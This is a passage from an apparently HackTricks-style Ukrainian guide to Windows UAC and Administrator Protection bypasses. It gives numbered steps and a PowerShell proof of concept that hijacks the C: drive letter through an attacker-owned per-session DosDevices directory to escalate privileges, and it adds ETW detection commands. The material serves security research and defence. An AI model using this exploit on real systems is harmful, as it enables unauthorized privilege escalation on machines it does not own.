Деякі ланцюжки атак, описані після 2024 року, вже не схожі на класичні перехоплення реєстру `HKCU\Software\Classes`. Наприклад, activation-context cache poisoning може поєднувати **перепризначення диска** та **DLL redirection**, щоб перейти від середнього до високого рівня цілісності через довірені UI / автоматично підвищувані бінарні файли, як-от `ctfmon.exe`, а згодом — цілі на кшталт `fodhelper.exe`. Замість дублювати тут великий PoC, перегляньте компактні приклади payload у:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Перехоплення літери диска через DOS-пристрій для сеансу входу в Administrator Protection (preview)

> [!NOTE]
> Станом на серпень 2026 року Microsoft і досі описує Administrator Protection як **попередню версію для учасників програми Insider**: розгортання в жовтні 2025 року було скасовано, а нову дату заплановано на майбутнє. Перед тестуванням цих ланцюжків переконайтеся, що **Admin Approval Mode with Administrator protection** справді ввімкнено, а пристрій перезавантажено; сама лише стандартна версія 25H2 не доводить, що функція активна.<sup>[[10]](#references)</sup>

Повний опис поверхні атаки `RAiLaunchAdminProcess` / UIAccess у попередніх збірках Windows 11 25H2 дивіться на окремій сторінці:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 «Administrator Protection» використовує токени shadow-admin із картами `\Sessions\0\DosDevices/<LUID>` для кожного сеансу. Каталог створюється за потреби функцією `SeGetTokenDeviceMap` під час першого звернення до `\??`. Якщо зловмисник уособлює токен shadow-admin лише з рівнем **SecurityIdentification**, каталог створюється зловмисником як **власником** (успадковується `CREATOR OWNER`), що дає змогу створювати посилання на літери дисків, які мають пріоритет над `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Кроки:**

1. З сеансу з низькими привілеями викличте `RAiProcessRunOnce`, щоб запустити `runonce.exe` shadow-admin без запиту.
2. Дублюйте його первинний токен як токен **ідентифікації** та уособлюйте його під час відкриття `\??`, щоб примусово створити `\Sessions\0\DosDevices/<LUID>` із правом власності зловмисника.
3. Створіть там символьне посилання `C:`, що вказує на сховище, контрольоване зловмисником; подальший доступ до файлової системи в цьому сеансі спрямовуватиме `C:` до шляху зловмисника, що дасть змогу перехоплювати DLL/файли без запиту.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

На preview-хостах Administrator Protection записує схвалення та невдалі спроби як події ETW **15031** і **15032** у провайдері `Microsoft-Windows-LUA`. Події містять SID запитувача, шлях до програми, результат, керований обліковий запис адміністратора та метод автентифікації, тож повторні спроби експлуатації або невдалі спроби керування інтерфейсом не залишаються поза телеметрією.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Документація Microsoft – Як працює User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – збірка технік обходу UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – сканер сумісності та запуску обходу UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI використовує AI для створення бекдорів PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: експлуатація 0-Day проти урядових цілей у Південно-Східній Азії](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – обхід Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – обхід UAC за допомогою завдання SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – обходи UnifiedConsent, TabTip і Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – захист адміністратора](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – виклик локальних Windows RPC-серверів із .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte вдосконалює CoolClient за допомогою підписаного руткіта ядра Windows](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: повністю невиявний троян для Windows, створений для шпигунства, крадіжок і залякування](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
{{#include ../../banners/hacktricks-training.md}}
